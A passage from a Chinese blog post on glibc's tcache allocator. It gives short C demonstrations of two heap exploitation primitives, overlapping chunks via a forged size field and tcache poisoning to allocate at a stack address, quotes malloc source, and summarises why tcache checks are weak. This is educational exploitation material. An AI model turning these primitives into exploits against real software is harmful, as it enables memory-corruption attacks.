<h2 id="overlapping-chunks-by-caching"><a href="#overlapping-chunks-by-caching" class="headerlink" title="overlapping_chunks_by_caching"></a>overlapping_chunks_by_caching</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p><code>overlapping_chunks</code> 这种技术非常经典了， 不过在 <code>tcache</code> 里面就非常的简单了， 修改 <code>chunk</code> 的 <code>size</code> 为 <code>fake_size</code> ， 然后 <code>free</code> 掉它，就会进入 <code>fake_size</code> 对应的 <code>tcache</code> ， 然后在 分配 <code>fake_size</code> 的 <code>chunk</code> 就可以拿到这个 <code>chunk</code> , <strong>overlap chunk</strong></p>
<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *sentry = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sentry, <span class="string">'b'</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem: %p, sentry: %p\n"</span>,mem, sentry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    *(<span class="keyword">long</span>* )(mem - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;  <span class="comment">// 设置 chunk-&gt;size = 0x110</span></span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">// 分配一个 0x110 的chunk</span></span><br><span class="line">    <span class="built_in">memset</span>(mem2, <span class="string">'a'</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过修改 <code>mem</code> 所在 <code>chunk</code> 的 <code>size</code> 为 <code>0x110</code></p>
<p>然后释放掉他 ，然后分配一个 <code>0x110</code> 的 <code>chunk</code> ，我们就会再次分配到它。此时 <code>mem2</code> 的 <code>chunk</code> 包含了 <code>sentry</code> 的 <code>chunk</code></p>
<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>通过修改 <code>free</code> 状态的 <code>tcache</code> 里面的 <code>chunk</code> 的 <code>fd</code> （其实就是 <code>tcache_entry-&gt;next</code> ) ，可以分配到任意地址</p>
<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> target[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack: %p\n"</span>,target);</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    *(<span class="keyword">long</span> *)(mem) = (<span class="keyword">long</span>)target; </span><br><span class="line">    <span class="keyword">char</span> *mem1 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分配一个 <code>0x50</code> 的 <code>chunk</code> 然后释放它，进入 <code>tcache</code> ，然后修改 <code>fd</code> 为 <code>target</code></p>
<p>然后分配两次 <code>0x50</code> 的 <code>chunk</code> 就可以分配到 <code>target</code></p>
<p>成功分配到了 栈上面。</p>
<p>其实 <code>fd</code> 为任意地址都行，原因在于 <code>tcache_get</code> 直接从 <code>tcache-&gt;entries</code> 里面拿 <code>chunk</code> ， 而不检查 拿到的 <code>chunk</code> 是否合法。</p>
<p>同时 在 <code>malloc</code> 分配内存时，首先使用 <code>tcache</code> ，而它判断 <code>tcache</code> 有没有可以分配的 <code>chunk</code> , 是直接判断指定项有没有指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 根据tcache-&gt;entries[tc_idx]是否为空判断是否有chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p><code>tcache</code> 的引入使得 <code>heap</code> 相关的漏洞的利用非常的简单了。</p>
<p>简单的原因主要在于 <code>tcache</code> 里面没有做什么检查， 同时还会优先使用这使得原来 <code>malloc</code> 里面的 <code>check</code> 也没有了作用。</p>
<p><code>free</code> 的话 释放内存如果大小在 <code>tcache</code> 的范围内， 只检测 <strong>size 和 指针</strong> 是否合法，而且检测非常弱。</p>
<p><code>malloc</code> 时 也是优先使用 <code>tcache</code> ， 只要 <code>tcache-&gt;entries[tc_idx]</code> 非空就可以从 <code>tcache</code> 分配。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="noopener">http://tukan.farm/2017/07/08/tcache/</a></p>
<p><a href="https://www.anquanke.com/post/id/104760" target="_blank" rel="noopener">https://www.anquanke.com/post/id/104760</a></p>
<p><a href="https://www.cnblogs.com/hac425/p/9416796.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9416796.html</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">nocbtm</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nocbtm.github.io/2020/02/27/tcache机制/">https://nocbtm.github.io/2020/02/27/tcache机制/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://nocbtm.github.io">nocbtm's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn    </a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button"><i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lozad post-qr-code__img" src="/img/wechatpay.png"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lozad post-qr-code__img" src="/img/alipay.png"><div class="post-qr-code__desc">支付宝</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull-left"><a href="/2020/02/27/unlink/"><img class="prev_cover lozad" data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>unlink</span></div></a></div><div class="next-post pull-right"><a href="/2020/02/26/free源码简单分析/"><img class="next_cover lozad" data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>free源码简单分析</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2019/09/25/数字经济 pwn amazon writeup/" title="数字经济 pwn amazon writeup"><img class="relatedPosts_cover lozad"data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><div class="relatedPosts_title">数字经济 pwn amazon writeup</div></a></div><div class="relatedPosts_item"><a href="/2019/10/14/2019-RoarCTF-pwn-writeup/" title="2019 RoarCTF pwn writeup"><img class="relatedPosts_cover lozad"data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><div class="relatedPosts_title">2019 RoarCTF pwn writeup</div></a></div><div class="relatedPosts_item"><a href="/2020/01/20/2019-xman-writeup/" title="2019 xman writeup"><img class="relatedPosts_cover lozad"data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><div class="relatedPosts_title">2019 xman writeup</div></a></div><div class="relatedPosts_item"><a href="/2020/08/22/2020国赛线上赛-pwn-wp/" title="2020国赛线上赛 pwn wp"><img class="relatedPosts_cover lozad"data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><div class="relatedPosts_title">2020国赛线上赛 pwn wp</div></a></div><div class="relatedPosts_item"><a href="/2019/11/01/360杯-pwn-writeup/" title="360杯 pwn writeup"><img class="relatedPosts_cover lozad"data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><div class="relatedPosts_title">360杯 pwn writeup</div></a></div><div class="relatedPosts_item"><a href="/2020/04/20/HFCTF-pwn-witeup/" title="HFCTF pwn witeup"><img class="relatedPosts_cover lozad"data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><div class="relatedPosts_title">HFCTF pwn witeup</div></a></div></div><div class="clear_both"></div></div></div></div><footer><div id="footer"><div class="copyright">&copy;2018 - 2020 By nocbtm</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div><div class="icp"><a><img class="icp-icon" src="/img/icp.png"><span></span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换">繁</a><i class="nightshift fa fa-moon-o" id="nightshift" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/nightshift.js"></script><script src="/js/baidupush.js"> </script><script src="/js/activate-power-mode.js"></script><script>POWERMODE.colorful = true; // make power mode colorful
POWERMODE.shake = true; // turn off shake
document.body.addEventListener('input', POWERMODE);
</script><script src="/js/tw_cn.js"></script><script>translateInitilization()

</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@1.2.2/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script><script>const observer = lozad(); // lazy loads elements with default selector as '.lozad'
observer.observe();
</script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"wanko","mobileShow":false,"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>